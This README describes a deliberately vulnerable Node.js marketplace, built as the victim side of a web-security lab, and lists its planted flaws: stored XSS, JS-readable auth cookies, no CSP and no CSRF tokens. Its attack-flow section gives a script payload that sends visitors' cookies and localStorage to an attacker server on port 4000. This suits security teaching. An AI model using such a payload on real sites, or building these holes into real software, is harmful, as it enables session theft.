# marketplace-vulneravel

🇺🇸 English | 🇧🇷 [Português](README.md)

> ⚠️ A **deliberately vulnerable** e-commerce app for hands-on web security learning. Pairs with [servidor-malicioso](https://github.com/cHIsIMun/servidor-malicioso).

## 🚨 Security warning

This application is **intentionally insecure**. **Never** deploy it publicly or use it in production. Run it **only** on an isolated localhost for:
- academic web-security learning,
- testing security tooling,
- demonstrating attack flows.

## Overview

A simple e-commerce marketplace that intentionally ships with web vulnerabilities so you can study how they are exploited — and how stored data can be exfiltrated through script injection. It is the "victim" half of a lab; the companion [servidor-malicioso](https://github.com/cHIsIMun/servidor-malicioso) acts as the attacker's data sink.

## Demonstrated vulnerabilities (confirmed in code)

- **Stored XSS (critical)** — product descriptions are rendered unescaped (`<%- product.description %>` in `views/product.ejs`) and stored without sanitization. An injected `<script>` runs for every visitor of `/product/:id`.
- **Cookies without `HttpOnly`/`Secure`** — JWT/refresh tokens are set as JS-readable cookies, so XSS can steal them.
- **No Content-Security-Policy** — no restriction on script origins.
- **No CSRF protection** — POST routes (`/add-product`, `/register`, `/login`) accept requests without CSRF tokens.
- **SQL injection: mitigated** — queries use parameterized statements (good practice kept intentionally).

## Attack flow (lab)

1. Log in and add a product whose description contains `<script>fetch('http://localhost:4000/webhook', {...})</script>`.
2. The script is stored in SQLite.
3. Any visitor to `/product/:id` executes it.
4. Cookies / localStorage are exfiltrated to **servidor-malicioso** (port 4000).

## Stack

Node.js · Express · EJS · JWT · bcrypt · SQLite3 · Tailwind CSS. Runs on port 3000.

## Running

```bash
npm install
echo "JWT_SECRET=your_secret_here" > .env
npm start          # http://localhost:3000
```

## License

This project does not yet declare a license. Until one is added, all rights are reserved by the author.
